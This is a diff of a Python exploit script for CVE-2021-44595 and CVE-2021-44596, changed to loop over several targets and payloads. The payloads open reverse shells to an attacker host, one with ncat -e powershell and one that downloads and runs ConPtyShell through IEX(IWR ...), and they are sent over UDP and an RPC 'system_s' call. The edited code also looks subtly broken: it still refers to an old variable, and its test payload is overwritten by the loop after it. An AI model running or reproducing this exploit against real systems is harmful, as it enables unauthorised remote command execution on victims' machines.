@@ -13,12 +13,14 @@ except Exception as ex:
 
 reverse_shell_ip = "10.1.1.21"
 reverse_shell_port = 1038
-target_ip = "10.1.1.10"
+target_ips = ["10.1.1.10"]
 target_ports = [1002, 1032] # optional, if not sure just set to []
 
 ncat_dir = "C:\\Temp\\nc64.exe"
-payload = f"{ncat_dir} {reverse_shell_ip} {reverse_shell_port} -e powershell"
-#payload = f"IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {reverse_shell_ip} {reverse_shell_port}"
+payload1 = f"{ncat_dir} {reverse_shell_ip} {reverse_shell_port} -e powershell"
+payload2 = f"IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {reverse_shell_ip} {reverse_shell_port}"
+
+payloads = [payload1, payload2]
 
 # Writes a file to test which method works
 test_payloads = False
@@ -44,32 +46,33 @@ else:
     if reverse_shell_ip == target_ip or reverse_shell_ip in ["127.0.0.1", "::1"]:
         ports_to_scan.remove(reverse_shell_port)
 
-def send_payload_44596(port):
+def send_payload_44596(port, payload):
     byte_message = bytes(payload, "utf-8")
     opened_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     opened_socket.sendto(byte_message, (target_ip, port))
-def send_payload_44595(port):
+def send_payload_44595(port, payload):
     client = msgpackrpc.Client(msgpackrpc.Address(target_ip, port))
     result = client.call('system_s','powershell',payload)
 
 
 sent_packets = []
 for port in ports_to_scan:
-    if test_payloads:
-        import random; randomint = random.randint(0, 999_999_999)
-        payload = f'echo "{reverse_shell_ip}, {reverse_shell_port}:  {target_ip}, {port}" > {dir_for_tests}{randomint}.txt'
-    if enable44595: 
-        try:
-            send_payload_44595(port)
-            print("[2021-44595] Payload successfully sent to port:", port)
-        except:
-            print("[2021-44595] Payload failed to send to port:", port)
-    try:
-        send_payload_44596(port)
-        print("[2021-44596] Payload successfully sent to port:", port)
-    except:
-        print("[2021-44596] Payload failed to send to port:", port)
-        
-            
+    for target_ip in target_ips:
+        if test_payloads:
+            import random; randomint = random.randint(0, 999_999_999)
+            payload = f'echo "{reverse_shell_ip}, {reverse_shell_port}:  {target_ip}, {port}" > {dir_for_tests}{randomint}.txt'
+        for payload in payloads:
+            if enable44595: 
+                try:
+                    send_payload_44595(port, payload)
+                    print("[2021-44595] Payload successfully sent to port:", port)
+                except:
+                    print("[2021-44595] Payload failed to send to port:", port)
+            try:
+                send_payload_44596(port, payload)
+                print("[2021-44596] Payload successfully sent to port:", port)
+            except:
+                print("[2021-44596] Payload failed to send to port:", port)
+               
     
         
